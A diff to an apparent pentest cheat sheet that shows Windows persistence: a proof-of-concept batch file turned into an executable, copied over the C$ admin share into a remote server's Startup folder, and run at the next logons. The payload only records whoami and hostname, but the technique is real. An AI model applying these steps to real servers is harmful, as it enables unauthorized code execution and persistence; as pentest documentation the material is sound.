@@ -277,8 +277,8 @@ PS C:\WINDOWS\system32>
 Step 2. We create our 'malicious' executable file (basic PoC/example)
 ----------------------------------------------------------------------
 
-PS C:\WINDOWS\system32> echo "cmd /c whoami >> C:\Users\Public\test.txt" > C:\temp\launcher.bat
-PS C:\WINDOWS\system32> echo "cmd /c hostname >> C:\Users\Public\test.txt" >> C:\temp\launcher.bat
+PS C:\WINDOWS\system32> echo "cmd /c whoami >> C:\Users\Public\Documents\test.txt" > C:\temp\launcher.bat
+PS C:\WINDOWS\system32> echo "cmd /c hostname >> C:\Users\Public\Documents\test.txt" >> C:\temp\launcher.bat
 
 => Then we use the tool 'bat2exe.exe' to covert the batch script 'launcher.bat' into an executable file 'launcher.exe'
 
@@ -286,8 +286,8 @@ PS C:\WINDOWS\system32> echo "cmd /c hostname >> C:\Users\Public\test.txt" >> C:
 Step 3. We copy our 'malicious' executable file into the Startup folder of the remote target Windows server
 ------------------------------------------------------------------------------------------------------------
 
-PS C:\WINDOWS\system32> xcopy C:\temp\launcher.exe "\\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.exe"
-Does \\192.168.1.64\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat specify a file name
+PS C:\WINDOWS\system32> xcopy C:\temp\launcher.exe "\\192.168.13.154\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.exe"
+Does \\192.168.13.154\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.exe specify a file name
 or directory name on the target
 (F = file, D = directory)? F
 C:\temp\launcher.exe
@@ -308,21 +308,16 @@ Step 4. Now each time an account will log into the remote target Windows server,
 
 As a PoC when I logged (RDP) with the accounts 'Administrator' and 'Pentester' on the target Windows server, the executable file 'launcher.exe' was executed .
 
-PS C:\WINDOWS\system32> ls "\\192.168.1.64\C$\Users\Public\"
+PS C:\WINDOWS\system32> ls "\\192.168.1.64\C$\Users\Public\Documents"
 
-    Directory: \\192.168.1.64\C$\Users\Public
+    Directory: \\192.168.1.64\C$\Users\Public\Documents
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
-d-r---        30/07/2020     13:51                Documents
-d-r---        22/08/2013     17:39                Downloads
-d-r---        22/08/2013     17:39                Music
-d-r---        22/08/2013     17:39                Pictures
-d-r---        22/08/2013     17:39                Videos
 -a----        25/08/2022     18:34             72 test.txt
 
 
-PS C:\WINDOWS\system32> cat "\\192.168.1.64\C$\Users\Public\test.txt"
+PS C:\WINDOWS\system32> cat "\\192.168.1.64\C$\Users\Public\Documents\test.txt"
 temp-sqldb\pentester
 TEMP-SQLDB
 temp-sqldb\administrator
